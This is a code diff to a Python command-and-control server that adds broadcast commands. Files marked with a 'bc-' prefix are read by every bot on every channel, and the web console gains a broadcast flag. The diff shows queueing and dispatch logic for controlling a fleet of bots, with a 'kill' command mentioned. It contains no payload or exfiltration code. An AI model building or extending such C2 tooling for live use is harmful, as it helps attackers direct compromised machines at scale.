@@ -75,6 +75,19 @@ def next_command(queue_dir, channel, tag=None):
         if _channel_of(fn) not in (None, channel):
             continue
         src = os.path.join(queue_dir, fn)
+        # Broadcast commands (bc- prefix) are peeked, never consumed:
+        # every bot on every channel sees them on every poll. The only
+        # sane broadcast payload is `kill` — it is one-way and the bot
+        # exits before it can poll again, so re-delivery is harmless.
+        if fn.startswith("bc-"):
+            try:
+                with open(src) as f:
+                    data = json.load(f)
+            except (json.JSONDecodeError, OSError):
+                continue
+            if data.get("broadcast"):
+                return data
+            continue
         claimed = src + ".claimed"
         try:
             os.rename(src, claimed)
@@ -816,9 +829,12 @@ class ConsoleHandler(BaseHTTPRequestHandler):
                 return
             target = (j.get("target") or "").strip()
             args = (j.get("args") or "").strip()
-            cid = c2.enqueue_command(target, cmd, args, "console")
+            broadcast = bool(j.get("broadcast"))
+            cid = c2.enqueue_command(target, cmd, args, "console",
+                                     broadcast=broadcast)
             self._send(json.dumps({"id": cid, "target": target,
-                                   "cmd": cmd, "args": args}),
+                                   "cmd": cmd, "args": args,
+                                   "broadcast": broadcast}),
                        "application/json")
             return
         self._send(json.dumps({"error": "unknown"}), "application/json", 404)
@@ -934,14 +950,17 @@ class C2:
     def is_bot(self, ip):
         return not self.bot_ip or ip == self.bot_ip
 
-    def enqueue_command(self, target, cmd, args, source):
+    def enqueue_command(self, target, cmd, args, source, broadcast=False):
         cid = self.state.record_command(target, cmd, args)
-        prefix = ""
+        prefix = "bc-" if broadcast else ""
         ts = int(time.time() * 1000)
-        fn = os.path.join(self.queue_dir, f"cmd-{ts}-{os.getpid()}-{cid:04d}.json")
+        fn = os.path.join(self.queue_dir,
+                          f"{prefix}cmd-{ts}-{os.getpid()}-{cid:04d}.json")
         with open(fn, "w") as f:
-            json.dump({"cmd": cmd, "args": args, "target": target, "_id": cid}, f)
-        log(f"QUEUE {source} -> target={target or 'any'} cmd={cmd} args={args} ({fn})")
+            json.dump({"cmd": cmd, "args": args, "target": target,
+                       "_id": cid, "broadcast": broadcast}, f)
+        log(f"QUEUE {source} -> target={target or 'any'}"
+            f" broadcast={broadcast} cmd={cmd} args={args} ({fn})")
         return cid
 
 
